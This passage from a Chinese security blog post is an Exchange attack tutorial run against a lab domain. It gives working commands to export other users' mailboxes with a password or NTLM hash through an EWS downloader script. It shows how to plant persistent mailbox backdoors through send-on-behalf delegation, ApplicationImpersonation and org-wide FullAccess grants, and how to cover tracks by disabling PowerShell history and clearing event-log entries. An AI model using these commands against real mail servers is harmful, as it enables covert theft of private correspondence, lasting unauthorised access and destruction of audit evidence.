+<h3 id="ewsMange"><a href="#ewsMange" class="headerlink" title="ewsMange"></a>ewsMange</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">知道账号密码:</span><br><span class="line">python3 ewsManage_Downloader.py 192.168.202.205 443 plaintext hack-guan.com exchange Guan@147852 download</span><br><span class="line"></span><br><span class="line">知道账号hash:</span><br><span class="line">python3 ewsManage_Downloader.py 192.168.202.205 443 ntlmhash hack-guan.com exchange ae49d414de793c963ee9bb7390874c77 download</span><br></pre></td></tr></table></figure>
+
+<p>账号+明文密码</p>
+<p><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/1689399628068-14177297-36ed-45c0-840e-69ff51984c36.png"></p>
+<p>账号+ntlm hash </p>
+<p><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/1689399604908-634b755a-2a60-4f17-a91b-7dbad6186064.png"></p>
+<p>导出结果</p>
+<p><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/1689400049681-194a5a98-9a12-4b75-9178-acda1996f7e4.png"></p>
+<p>查看内容</p>
+<p><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/1689400078101-2093aa40-a780-4112-9e72-bd26b5c9a144.png"></p>
+<h1 id="邮箱后门接管种植"><a href="#邮箱后门接管种植" class="headerlink" title="邮箱后门接管种植"></a>邮箱后门接管种植</h1><h2 id="委托（Delegate-Access）代表发送"><a href="#委托（Delegate-Access）代表发送" class="headerlink" title="委托（Delegate Access）代表发送"></a>委托（Delegate Access）代表发送</h2><p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/exchange/manage-permissions-for-recipients-exchange-2013-help">https://learn.microsoft.com/zh-cn/exchange/manage-permissions-for-recipients-exchange-2013-help</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">为exchange1添加exchange的代表发送权限：</span><br><span class="line">Powershell.exe -psconsolefile &quot;C:\\program files\\Microsoft\\Exchange Server\\v15\\Bin\\exshell.psc1&quot; -command &quot;Set-Mailbox -Identity exchange@hack-guan.com -GrantSendOnBehalfTo exchange1&quot;</span><br><span class="line"></span><br><span class="line">查看是否有代表发送的权限</span><br><span class="line">Powershell.exe -psconsolefile &quot;C:\\program files\\Microsoft\\Exchange Server\\v15\\Bin\\exshell.psc1&quot; -command &quot;Get-Mailbox -Identity &lt;mailbox&gt; | Format-List GrantSendOnBehalfTo&quot;</span><br><span class="line"></span><br><span class="line">&lt;mailbox&gt; 邮箱地址</span><br><span class="line"></span><br><span class="line">删除exchange1对exchange的代表发送权限</span><br><span class="line">Powershell.exe -psconsolefile &quot;C:\\program files\\Microsoft\\Exchange Server\\v15\\Bin\\exshell.psc1&quot; -command &quot;Set-Mailbox exchange -GrantSendOnBehalfTo @&#123;remove=&#x27;exchange1@hack-guan.com&#x27;&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>委托代表发送权限<br><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/image-20250328010150620.png" alt="image-20250328010150620"></p>
+<p><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/image-20250328010226955.png" alt="image-20250328010226955"></p>
+<p>查看委托结果<br><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/image-20250328010252924.png" alt="image-20250328010252924"></p>
+<p>删除代表发送权限<br><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/image-20250328010318173.png" alt="image-20250328010318173"></p>
+<h2 id="模拟（impersonation）"><a href="#模拟（impersonation）" class="headerlink" title="模拟（impersonation）"></a>模拟（impersonation）</h2><p>查看具有模拟权限的用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Powershell.exe -psconsolefile &quot;C:\\program files\\Microsoft\\Exchange Server\\v15\\Bin\\exshell.psc1&quot; -command &quot;Get-ManagementRoleAssignment -Role:ApplicationImpersonation&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Powershell.exe -psconsolefile &quot;C:\\program files\\Microsoft\\Exchange Server\\v15\\Bin\\exshell.psc1&quot; -command &quot;Set-PSReadlineOption -HistorySaveStyle SaveNothing&quot;</span><br><span class="line"></span><br><span class="line">powershell.exe -psconsolefile &quot;C:\\program files\\Microsoft\\Exchange Server\\v15\\Bin\\exshell.psc1&quot; -Command &quot;Get-EventLog -LogName Application -Source &#x27;PowerShell*&#x27; -After &#x27;2023-07-30T00:00:00&#x27; -Before &#x27;2023-07-31T00:00:00&#x27; | ForEach-Object &#123;Clear-EventLog -LogName Application -InstanceID $_.Index&#125;&quot;</span><br><span class="line"></span><br><span class="line">webshell 执行powershell命令不会留下命令记录在某文件，但会有相应的windows powershell日志记录</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/image-20250328010343458.png" alt="image-20250328010343458"></p>
+<p>创建一个具有模拟权限的用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Powershell.exe -psconsolefile &quot;C:\\program files\\Microsoft\\Exchange Server\\v15\\Bin\\exshell.psc1&quot; -command &quot;New-ManagementRoleAssignment -Role:ApplicationImpersonation -User: exchange1@hack-guan.com&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/image-20250328010412025.png" alt="image-20250328010412025"><br><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/image-20250328010437143.png" alt="image-20250328010437143"></p>
+<p>删除用户的模拟权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo Y | Powershell.exe -psconsolefile &quot;C:\\program files\\Microsoft\\Exchange Server\\v15\\Bin\\exshell.psc1&quot; -command &quot;Remove-ManagementRoleAssignment &#x27;ApplicationImpersonation-exchange1&#x27;&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/image-20250328010503093.png" alt="image-20250328010503093"></p>
+<p>利用模拟权限和ews接口导出目标邮件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ewsManage_Downloader_v2.py 192.168.202.205 443 ntlmhash hack-guan.com exchange ae49d414de793c963ee9bb7390874c77 search</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/image-20250328010530473.png" alt="image-20250328010530473"></p>
+<h2 id="fullaccess"><a href="#fullaccess" class="headerlink" title="fullaccess"></a>fullaccess</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_34123613/article/details/90079532">(8条消息) Powershell管理系列（十一）Exchange完全访问权限邮箱的设置_weixin_34123613的博客-CSDN博客</a></p>
+<p>设置fullaccess权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Powershell.exe -psconsolefile &quot;C:\\program files\\Microsoft\\Exchange Server\\v15\\Bin\\exshell.psc1&quot; -command &quot;Get-Mailbox -ResultSize unlimited -Filter &#123;(RecipientTypeDetails -eq &#x27;UserMailbox&#x27;) -and (Alias -ne &#x27;exchange&#x27;)&#125; | Add-MailboxPermission -User exchange -AccessRights fullaccess -InheritanceType all&quot;</span><br><span class="line"></span><br><span class="line">Alias -ne &#x27;exchange&#x27; 设置例外，这里设置为自己，就可以所有人都可以访问了</span><br><span class="line"></span><br><span class="line">-User exchange 设置权限的对象</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/image-20250328010554095.png" alt="image-20250328010554095"></p>
+<p>验证权限设置：在登陆exchange的后，url修改为<a target="_blank" rel="noopener" href="https://exchange.com/owa/exchange1@hack-guan.com">https://exchange.com/owa/exchange1@hack-guan.com</a> 成访问exchane1的邮箱内容<br><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/image-20250328010618202.png" alt="image-20250328010618202"></p>
+<p>删除用户exchange的fullaccess权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo a | Powershell.exe -psconsolefile &quot;C:\\program files\\Microsoft\\Exchange Server\\v15\\Bin\\exshell.psc1&quot; -command &quot;Get-Mailbox -ResultSize unlimited -Filter &#123;(RecipientTypeDetails -eq &#x27;UserMailbox&#x27;) -and (Alias -ne &#x27;exchange&#x27;)&#125; | Remove-MailboxPermission -User exchange -AccessRights fullaccess -InheritanceType all&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/image-20250328010645500.png" alt="image-20250328010645500"></p>
+<p>再次访问无效</p>
+<p><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/image-20250328010713151.png" alt="image-20250328010713151"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">caixiaoguan</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/">http://example.com/2023/10/30/exchange专题/exchange专题/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">caixiaoguan's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/my.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2023/10/19/Dcsync%E5%88%A9%E7%94%A8/dcsync%E5%88%A9%E7%94%A8/" title="dcsync利用"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">dcsync利用</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/my.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">caixiaoguan</div><div class="author-info__description">原来你也想证实一下</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#exchange%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E8%A3%85"><span class="toc-number">1.</span> <span class="toc-text">exchange服务器安装</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#exchange-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%94%BB%E5%87%BB"><span class="toc-number">2.</span> <span class="toc-text">exchange 服务器攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.1.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%EF%BC%89%E5%8F%91%E7%8E%B0%E5%B9%B6%E9%94%81%E5%AE%9Aexchange%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">2.1.1.</span> <span class="toc-text">1）发现并锁定exchange服务器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="toc-number">2.1.2.</span> <span class="toc-text">端口指纹识别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96exchange%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%89%88%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">2.1.3.</span> <span class="toc-text">获取exchange服务器版本信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%A5%E5%8F%A3%E7%88%86%E7%A0%B4"><span class="toc-number">2.2.</span> <span class="toc-text">接口爆破</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B%E5%8F%AF%E7%88%86%E7%A0%B4%E7%9A%84%E6%8E%A5%E5%8F%A3"><span class="toc-number">2.2.1.</span> <span class="toc-text">检测可爆破的接口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%89%E6%8B%A9%E7%9B%B8%E5%BA%94%E6%8E%A5%E5%8F%A3%E7%88%86%E7%A0%B4"><span class="toc-number">2.2.2.</span> <span class="toc-text">选择相应接口爆破</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BB%BA%E7%AB%8B%E4%BB%A3%E7%90%86"><span class="toc-number">2.2.2.1.</span> <span class="toc-text">建立代理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%BC%E5%87%BA%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95"><span class="toc-number">2.2.2.2.</span> <span class="toc-text">导出活动目录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E9%82%AE%E7%AE%B1%E8%B4%A6%E5%8F%B7"><span class="toc-number">2.2.2.3.</span> <span class="toc-text">获取邮箱账号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E7%88%86%E7%A0%B4%E7%94%A8%E7%9A%84user-txt%E5%92%8C%E5%AF%86%E7%A0%81%E5%AD%97%E5%85%B8pass-txt"><span class="toc-number">2.2.2.4.</span> <span class="toc-text">生成爆破用的user.txt和密码字典pass.txt</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.3.</span> <span class="toc-text">探测漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2021-26855"><span class="toc-number">2.3.1.</span> <span class="toc-text">CVE-2021-26855</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%88%B0%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="toc-number">2.3.1.1.</span> <span class="toc-text">使用到的命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%85%AC%E5%BC%80%E7%9A%84poc%E8%8E%B7%E5%BE%97webshell"><span class="toc-number">2.3.1.2.</span> <span class="toc-text">利用公开的poc获得webshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5webshell"><span class="toc-number">2.3.1.3.</span> <span class="toc-text">连接webshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E5%B7%A5%E5%85%B7%EF%BC%9A%E4%BB%A3%E7%90%86%E3%80%81%E5%AF%BChash"><span class="toc-number">2.3.1.4.</span> <span class="toc-text">上传工具：代理、导hash</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8procdump%E5%AF%BC%E5%87%BAlsass%E6%96%87%E4%BB%B6"><span class="toc-number">2.3.1.5.</span> <span class="toc-text">利用procdump导出lsass文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E5%AF%BC%E5%87%BAhash"><span class="toc-number">2.3.1.6.</span> <span class="toc-text">本地导出hash</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BB%BA%E7%AB%8Bsocks5%E4%BB%A3%E7%90%86"><span class="toc-number">2.3.1.7.</span> <span class="toc-text">建立socks5代理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%99%E6%8B%BF%E4%B8%8B%E7%9A%84%E5%9F%9F%E7%94%A8%E6%88%B7%E8%B5%8B%E4%BA%88DCSync%E5%8A%9F%E8%83%BD"><span class="toc-number">2.3.1.8.</span> <span class="toc-text">给拿下的域用户赋予DCSync功能</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E8%BF%9C%E7%A8%8B%E5%AF%BC%E5%87%BA%E5%9F%9F%E6%89%80%E6%9C%89hash"><span class="toc-number">2.3.1.9.</span> <span class="toc-text">本地远程导出域所有hash</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E6%8B%BFshell%E6%96%B9%E5%BC%8F"><span class="toc-number">2.3.2.</span> <span class="toc-text">其他拿shell方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#cve-2020-0688"><span class="toc-number">2.3.2.1.</span> <span class="toc-text">cve-2020-0688</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#proxysehll"><span class="toc-number">2.3.2.2.</span> <span class="toc-text">proxysehll</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cve-2020-17144"><span class="toc-number">2.3.2.3.</span> <span class="toc-text">cve-2020-17144</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exchange%E5%AF%BC%E5%87%BA%E9%82%AE%E4%BB%B6"><span class="toc-number">2.4.</span> <span class="toc-text">exchange导出邮件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#powershell"><span class="toc-number">2.4.1.</span> <span class="toc-text">powershell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96exchange%E7%9A%84%E9%BB%98%E8%AE%A4%E5%AE%89%E8%A3%85%E8%B7%AF%E5%BE%84"><span class="toc-number">2.4.1.1.</span> <span class="toc-text">获取exchange的默认安装路径</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%89%80%E6%9C%89%E9%82%AE%E7%AE%B1%E4%BF%A1%E6%81%AF"><span class="toc-number">2.4.1.2.</span> <span class="toc-text">获取所有邮箱信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E9%82%AE%E4%BB%B6%E8%B7%9F%E8%B8%AA%E6%97%A5%E5%BF%97%E5%B9%B6%E5%88%86%E6%9E%90"><span class="toc-number">2.4.1.3.</span> <span class="toc-text">获取邮件跟踪日志并分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%BC%E5%87%BA%E5%B9%B6%E7%AD%9B%E9%80%89%E7%94%A8%E6%88%B7%E9%82%AE%E7%AE%B1%E5%86%85%E5%AE%B9"><span class="toc-number">2.4.1.4.</span> <span class="toc-text">导出并筛选用户邮箱内容</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#net-use%E4%B8%8Bcopy%E5%9B%9E%E6%9C%AC%E5%9C%B0"><span class="toc-number">2.4.1.5.</span> <span class="toc-text">net use下copy回本地</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ewsMange"><span class="toc-number">2.4.2.</span> <span class="toc-text">ewsMange</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%82%AE%E7%AE%B1%E5%90%8E%E9%97%A8%E6%8E%A5%E7%AE%A1%E7%A7%8D%E6%A4%8D"><span class="toc-number">3.</span> <span class="toc-text">邮箱后门接管种植</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A7%94%E6%89%98%EF%BC%88Delegate-Access%EF%BC%89%E4%BB%A3%E8%A1%A8%E5%8F%91%E9%80%81"><span class="toc-number">3.1.</span> <span class="toc-text">委托（Delegate Access）代表发送</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E6%8B%9F%EF%BC%88impersonation%EF%BC%89"><span class="toc-number">3.2.</span> <span class="toc-text">模拟（impersonation）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fullaccess"><span class="toc-number">3.3.</span> <span class="toc-text">fullaccess</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/" title="exchange专题">exchange专题</a><time datetime="2023-10-30T06:41:06.000Z" title="发表于 2023-10-30 14:41:06">2023-10-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/10/19/Dcsync%E5%88%A9%E7%94%A8/dcsync%E5%88%A9%E7%94%A8/" title="dcsync利用">dcsync利用</a><time datetime="2023-10-19T06:41:06.000Z" title="发表于 2023-10-19 14:41:06">2023-10-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/10/17/esxi%E6%8C%82%E8%BD%BD/esxi%E6%8C%82%E8%BD%BD/" title="esxi挂载">esxi挂载</a><time datetime="2023-10-17T06:41:06.000Z" title="发表于 2023-10-17 14:41:06">2023-10-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/09/11/DPAPI/DPAPI%E4%B8%93%E9%A2%98/" title="DPAPI专题">DPAPI专题</a><time datetime="2023-09-11T06:41:06.000Z" title="发表于 2023-09-11 14:41:06">2023-09-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/08/05/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/" title="日志分析">日志分析</a><time datetime="2023-08-05T06:41:06.000Z" title="发表于 2023-08-05 14:41:06">2023-08-05</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By caixiaoguan</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
